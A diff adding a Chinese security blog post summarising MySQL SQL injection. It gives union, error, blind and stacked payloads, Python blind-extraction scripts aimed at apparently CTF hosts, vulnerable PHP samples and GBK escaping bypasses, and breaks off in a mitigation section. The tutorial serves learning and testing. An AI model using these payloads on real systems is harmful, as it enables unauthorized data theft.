@@ -1,0 +1,974 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/avatar.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="Anemone's Blog" type="application/atom+xml">
+  <meta name="google-site-verification" content="Re5JdegRYzNFco-rC9lYIsvSWIgh5JvyfhuEaZCeFCk">
+  <meta name="baidu-site-verification" content="opTC8YN3Pn">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: 'GB90MXPJ1C',
+      apiKey: '05d808da3baf50ac2f2fad2dc3a3cd8f',
+      indexName: 'dev_blog',
+      hits: {"per_page":20},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="注入类型Union Based最基本的注入类型，以MySQL为例，假设有注入点：12SELECT * FROM `test` WHERE `username`=&amp;apos;admin&amp;apos; and `password`=&amp;apos;*&amp;apos;;0x01 判断注入点">
+<meta name="keywords" content="SQL,注入,waf绕过">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入总结">
+<meta property="og:url" content="http://anemone.top/sqli-SQL注入总结/index.html">
+<meta property="og:site_name" content="Anemone&#39;s Blog">
+<meta property="og:description" content="注入类型Union Based最基本的注入类型，以MySQL为例，假设有注入点：12SELECT * FROM `test` WHERE `username`=&amp;apos;admin&amp;apos; and `password`=&amp;apos;*&amp;apos;;0x01 判断注入点">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://anemone.top/sqli-SQL注入总结/1549959620738.png">
+<meta property="og:image" content="http://anemone.top/sqli-SQL注入总结/1551840783777.png">
+<meta property="og:updated_time" content="2021-04-26T13:55:29.204Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL注入总结">
+<meta name="twitter:description" content="注入类型Union Based最基本的注入类型，以MySQL为例，假设有注入点：12SELECT * FROM `test` WHERE `username`=&amp;apos;admin&amp;apos; and `password`=&amp;apos;*&amp;apos;;0x01 判断注入点">
+<meta name="twitter:image" content="http://anemone.top/sqli-SQL注入总结/1549959620738.png">
+  <link rel="canonical" href="http://anemone.top/sqli-SQL注入总结/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>SQL注入总结 | Anemone's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Anemone's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="fa fa-search fa-fw"></i>搜索</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input" id="search-input"></div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="algolia-results">
+  <div id="algolia-stats"></div>
+  <div id="algolia-hits"></div>
+  <div id="algolia-pagination" class="algolia-pagination"></div>
+</div>
+
+  
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://anemone.top/sqli-SQL注入总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Anemone">
+      <meta itemprop="description" content="关注Web安全、移动安全、Fuzz测试和机器学习">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Anemone's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">SQL注入总结
+
+          
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2019-02-12 15:53:50" itemprop="dateCreated datePublished" datetime="2019-02-12T15:53:50+08:00">2019-02-12</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-04-26 21:55:29" itemprop="dateModified" datetime="2021-04-26T21:55:29+08:00">2021-04-26</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Web安全-SQL注入/" itemprop="url" rel="index"><span itemprop="name">Web安全-SQL注入</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span id="/sqli-SQL注入总结/" class="post-meta-item leancloud_visitors" data-flag-title="SQL注入总结" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h1><h2 id="Union-Based"><a href="#Union-Based" class="headerlink" title="Union Based"></a>Union Based</h2><p>最基本的注入类型，以MySQL为例，假设有注入点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `test` </span><br><span class="line">WHERE `username`=&apos;admin&apos; and `password`=&apos;*&apos;;</span><br></pre></td></tr></table></figure><h3 id="0x01-判断注入点"><a href="#0x01-判断注入点" class="headerlink" title="0x01 判断注入点"></a>0x01 判断注入点</h3><a id="more"></a>
+
+<p>若原先能够查询到数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and &apos;1&apos;=&apos;1&apos;%23    #有数据</span><br><span class="line">admin&apos; and &apos;1&apos;=&apos;2&apos;%23    #无数据</span><br></pre></td></tr></table></figure>
+<p>若原先查询不到数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; or &apos;1&apos;=&apos;1&apos;%23    #有数据</span><br><span class="line">admin&apos; or &apos;1&apos;=&apos;2&apos;%23    #无数据</span><br></pre></td></tr></table></figure>
+<p>若为整数型</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">7 &amp;&amp; 1=2 %23</span><br><span class="line">7 &amp;&amp; 1=1 %23</span><br><span class="line">7 || 1=2 %23</span><br><span class="line">7 || 1=2 %23</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-查询共有多少字段"><a href="#0x02-查询共有多少字段" class="headerlink" title="0x02 查询共有多少字段"></a>0x02 查询共有多少字段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1%23 </span><br><span class="line">a&apos; UNION SELECT 1,2%23</span><br><span class="line">a&apos; UNION SELECT 1,2,3%23</span><br></pre></td></tr></table></figure>
+<p>…直到正常显示数据为止，或者：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&apos; ORDER BY 1%23</span><br><span class="line">a&apos; ORDER BY 2%23</span><br><span class="line">a&apos; ORDER BY 3%23</span><br></pre></td></tr></table></figure>
+<p>…直到网页报错为止。</p>
+<h3 id="0x03-查询库"><a href="#0x03-查询库" class="headerlink" title="0x03 查询库"></a>0x03 查询库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select SCHEMA_NAME,2,3,4,5 from information_schema.SCHEMATA %23</span><br></pre></td></tr></table></figure>
+<h3 id="0x04-查询表"><a href="#0x04-查询表" class="headerlink" title="0x04 查询表"></a>0x04 查询表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select TABLE_NAME,2,3,4,5 from information_schema.TABLES where TABLE_SCHEMA=&apos;test&apos; limit 0,1 %23 #第一个表</span><br><span class="line">a&apos; union select TABLE_NAME,2,3,4,5 from information_schema.TABLES where TABLE_SCHEMA=&apos;test&apos; limit 1,1 %23 #第二个表</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<h3 id="0x05-查询字段"><a href="#0x05-查询字段" class="headerlink" title="0x05 查询字段"></a>0x05 查询字段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select COLUMN_NAME,2,3,4,5 from information_schema.COLUMNS where TABLE_NAME=&apos;test&apos; limit 0,1 %23 #第一个字段</span><br><span class="line">a&apos; union select COLUMN_NAME,2,3,4,5 from information_schema.COLUMNS where TABLE_NAME=&apos;test&apos; limit 0,1 %23 #第二个字段</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<h3 id="0x05-查询记录"><a href="#0x05-查询记录" class="headerlink" title="0x05 查询记录"></a>0x05 查询记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select username,2,3,4,5 from test.test %23</span><br></pre></td></tr></table></figure>
+<h3 id="关于注释"><a href="#关于注释" class="headerlink" title="关于注释"></a>关于注释</h3><ul>
+<li><code>#</code>可以换成<code>%23</code></li>
+<li><code>--+</code></li>
+</ul>
+<h2 id="Error-Based"><a href="#Error-Based" class="headerlink" title="Error Based"></a>Error Based</h2><p>若有错误回显的情况下可以使用mysql的一些函数，引发错误，mysql报错时会将函数参数的值返回，如：</p>
+<p><img src="/sqli-SQL注入总结/1549959620738.png" alt="1549959620738"></p>
+<p>常用的报错函数有：</p>
+<ul>
+<li><p>updatexml()<br><code>updatexml(1,concat(0x7e,(select @@version),0x7e),1)</code></p>
+</li>
+<li><p>extractvalue()<br><code>extractvalue(1,concat(0x7e,version(),0x7e))</code></p>
+</li>
+<li><p>floor()<br><code>(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></p>
+</li>
+<li><p>geometrycollection() 、multipoint() 、polygon()、multipolygon()、linestring()、multilinestring() #5.5以上不适用</p>
+<p><code>geometrycollection((select * from(select * from(select user())a)b))</code></p>
+</li>
+<li><p>exp() #5.5以上不适用</p>
+<p><code>exp(~(select * from(select user())a));</code></p>
+</li>
+</ul>
+<h2 id="Bool-Time-Based-（Blind-Based）"><a href="#Bool-Time-Based-（Blind-Based）" class="headerlink" title="Bool/Time Based （Blind Based）"></a>Bool/Time Based （Blind Based）</h2><h3 id="Bool-Based"><a href="#Bool-Based" class="headerlink" title="Bool Based"></a>Bool Based</h3><p>若原先能够/不能查询到数据，那么若猜测字段正确，那么现在能够/不能查询数据。</p>
+<p>若原先能够查询到数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*&apos; and length((database()))&lt;8#</span><br><span class="line">*&apos; and ascii(substring((database()),1,1))=100# 猜测字段</span><br></pre></td></tr></table></figure>
+<p>若原先不能查询数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*&apos; or length((database()))&lt;8#</span><br><span class="line">*&apos; or ascii(substring((database()),1,1))=100# 猜测字段</span><br></pre></td></tr></table></figure>
+<p>给出exp模板：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=UTF-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">result = <span class="string">''</span></span><br><span class="line">url = <span class="string">'http://a3edf37f0d9741c6ad151c8bafbcad60fc11a19cf7f747a9.game.ichunqiu.com/index.php?'</span></span><br><span class="line">payload = <span class="string">'id=0 or if((ascii(substr((&#123;sql&#125;),&#123;list&#125;,1))&lt;&#123;num&#125;),1,0)'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        <span class="comment">#hh = payload.format(sql='select database()',list=str(i),num=str(j))</span></span><br><span class="line">        <span class="comment">#hh = payload.format(sql='select count(*) from information_schema.tables',list=str(i),num=str(j))</span></span><br><span class="line">        <span class="comment">#hh = payload.format(sql='select table_name from information_schema.tables limit 81,1',list=str(i),num=str(j))</span></span><br><span class="line">        hh = payload.format(sql=<span class="string">'select * from words.f14g'</span>,list=str(i),num=str(j))</span><br><span class="line">        <span class="comment">#print hh</span></span><br><span class="line">        zz = requests.get(url+hh)</span><br><span class="line">        <span class="comment">#print zz.content</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello Hacker!!'</span> <span class="keyword">in</span> zz.content:</span><br><span class="line">            result += chr(j<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">print</span> result</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<h3 id="Time-Based"><a href="#Time-Based" class="headerlink" title="Time Based"></a>Time Based</h3><p>那么若猜测字段正确，那么现在延迟一段时间后再返回。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&apos; or if(ascii(substring((database()),1,1))=116, sleep(100), 1);</span><br></pre></td></tr></table></figure>
+<p>给出exp模板：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'0123456789abcdef'</span>:</span><br><span class="line">        url = <span class="string">'http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if((ascii(substr((select flag from flag limit 0,1),'</span>+str(i)+<span class="string">',1))='</span>+str(ord(j))+<span class="string">'),sleep(3),0)--'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url=url,timeout=<span class="number">2.5</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<h3 id="其他用到的函数-关键字"><a href="#其他用到的函数-关键字" class="headerlink" title="其他用到的函数/关键字"></a>其他用到的函数/关键字</h3><ul>
+<li><p>regexp binary </p>
+<p><code>and password regexp binary ‘^A’#</code></p>
+</li>
+<li><p>mid() 同substr</p>
+<p><code>MID(version(),1,1)</code></p>
+</li>
+<li><p>ord() 同ascii</p>
+</li>
+</ul>
+<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>使用<code>;</code>结束上一句查询语句后再执行另一条语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM test;select if(1=1,SLEEP(100),1);</span><br></pre></td></tr></table></figure>
+<h1 id="非where的注入点"><a href="#非where的注入点" class="headerlink" title="非where的注入点"></a>非where的注入点</h1><h2 id="order-by注入点"><a href="#order-by注入点" class="headerlink" title="order by注入点"></a>order by注入点</h2><ul>
+<li><p>Error Based</p>
+<p><code>order by 1 and(updatexml(1,concat(0x7e,@@version,0x7e),0))</code></p>
+</li>
+<li><p>Time Based #5.5复现失败</p>
+<p><code>order by if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test))</code></p>
+</li>
+<li><p>Bool Based</p>
+<p><code>order by (select+1+regexp+if(substring(user(),1,1)=0x72,1,0x00))</code> </p>
+</li>
+</ul>
+<h2 id="limit注入点"><a href="#limit注入点" class="headerlink" title="limit注入点"></a>limit注入点</h2><ul>
+<li><code>limit 1,1 procedure analyse(extractvalue(1,concat(0x7e,version(),0x7e)),1)</code></li>
+</ul>
+<h2 id="group-by注入点"><a href="#group-by注入点" class="headerlink" title="group by注入点"></a>group by注入点</h2><p><code>GROUP BY if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test));</code></p>
+<h2 id="table注入点"><a href="#table注入点" class="headerlink" title="table注入点"></a>table注入点</h2><p><code>users where updatexml(1, concat(0x7e, (select user()), 0x7e), 1)#</code></p>
+<h2 id="desc注入点"><a href="#desc注入点" class="headerlink" title="desc注入点"></a>desc注入点</h2><p>desc不完全可控和table结合，需要保证desc成功，table报错，只有在desc和table只能有一个含”&#96;”时能注入（都含有或都不含有则无解）<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"xiaoyu"</span>);</span><br><span class="line">mysql_query(<span class="string">"use b2cshop"</span>);</span><br><span class="line">$table = $_GET[<span class="string">'table'</span>];</span><br><span class="line">mysql_query(<span class="string">"desc `shop_&#123;$table&#125;`"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"DESC 出错:"</span>.mysql_error()); <span class="comment">//表名不完全可控</span></span><br><span class="line">$sql = <span class="string">"select * from shop_&#123;$table&#125; where 1=1"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line">var_dump(mysql_fetch_array(mysql_query(<span class="string">"$sql"</span>)));</span><br><span class="line"><span class="keyword">echo</span> mysql_error();</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?table=users` `where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)#</span><br><span class="line"></span><br><span class="line">desc `shop_users` `where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)#`</span><br></pre></td></tr></table></figure>
+<h1 id="like-注入点"><a href="#like-注入点" class="headerlink" title="like 注入点"></a>like 注入点</h1><p>与where注入类似</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx' and '1'=updatexml(1,concat(0x7e,(<span class="keyword">select</span> SCHEMA_NAME <span class="keyword">from</span> information_schema.SCHEMATA <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>即使输入时使用了addslashes进行了过滤，但是MySQL的客户端字符集（character_set_client）设置为GBK、BIG5或其他，导致<code>/</code>在解码时被跳脱，例如有如下程序：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"gbk"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name=$_GET[<span class="string">'name'</span>];</span><br><span class="line">$name=addslashes($name); <span class="comment">//name被转义</span></span><br><span class="line"></span><br><span class="line">$conn=mysql_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);</span><br><span class="line">mysql_select_db(<span class="string">"test"</span>,$conn);</span><br><span class="line">$result=mysql_query(<span class="string">"SET NAMES 'GBK'"</span>);</span><br><span class="line">$sql=<span class="string">"select * from test where username='"</span>.$name.<span class="string">"'"</span>;</span><br><span class="line">$result=mysql_query($sql,$conn);</span><br><span class="line"><span class="keyword">if</span>($result)&#123;</span><br><span class="line">    <span class="keyword">while</span> ($row = mysql_fetch_assoc($result)) &#123;</span><br><span class="line">        print_r($row);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Error"</span>.mysql_error().<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>payload为<code>?name=admin%df%27%20union%20select%201,2%20%23</code></p>
+<p>编码过程<br><code>1&#39; ==addslashes==&gt; 1\&#39; (1\x5c\x27)</code><br><code>1%df&#39; ==addslashes==&gt; 1%df\&#39;(1\xdf\x5c\x27) ==encode(gbk)==&gt; 1運&#39;</code>     #<code>&#39;</code>逃逸</p>
+<h2 id="iconv转换情况"><a href="#iconv转换情况" class="headerlink" title="iconv转换情况"></a>iconv转换情况</h2><p>gbk编码转换成utf8时，转换时也会引发错误：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"gbk"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn=mysql_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);</span><br><span class="line">mysql_select_db(<span class="string">"test"</span>,$conn);</span><br><span class="line"></span><br><span class="line">$name=$_GET[<span class="string">'name'</span>];</span><br><span class="line">mysql_query(<span class="string">"set names UTF-8"</span>) ;</span><br><span class="line">$bar =iconv(<span class="string">"GBK"</span>,<span class="string">"UTF-8"</span>, addslashes($name));</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"select * from test where username='"</span>.$name.<span class="string">"'"</span>;</span><br><span class="line">$result=mysql_query($sql,$conn);</span><br><span class="line"><span class="keyword">if</span>($result)&#123;</span><br><span class="line">    <span class="keyword">while</span> ($row = mysql_fetch_assoc($result)) &#123;</span><br><span class="line">        print_r($row);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Error"</span>.mysql_error().<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>payload为<code>admin%e5%5c%27%20union%20select%201,2%20%23</code>(<code>admin%e5\&#39; union select 1,2 #</code>)</p>
+<p>编码过程（由于<code>\xe5\x5c</code>转为UTF-8为<code>\xe9\x8c\xa6</code>）：</p>
+<p><code>%e5\&#39; (\xe5\x5c\x27) ==addslashes==&gt; %e5\\\&#39; (\xe5\x5c\x5c\x5c\x27) ==iconv==&gt; \xe9\x8c\xa6\x5c\x5c\x27</code></p>
+<p>另外，若编码为BIG5时，payload为<code>1兝\&#39; =&gt; 1\xa2\x5c\x5c\x27 =&gt; 1?\\&#39;</code>。</p>
+<h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><ul>
+<li><p>换用utf8字符集</p>
+</li>
+<li><p>使用mysql_set_charset()设置字符集并且使用mysql_real_escape_string()转义，其会考虑当前字符集所以不会产生逃逸问题：</p>
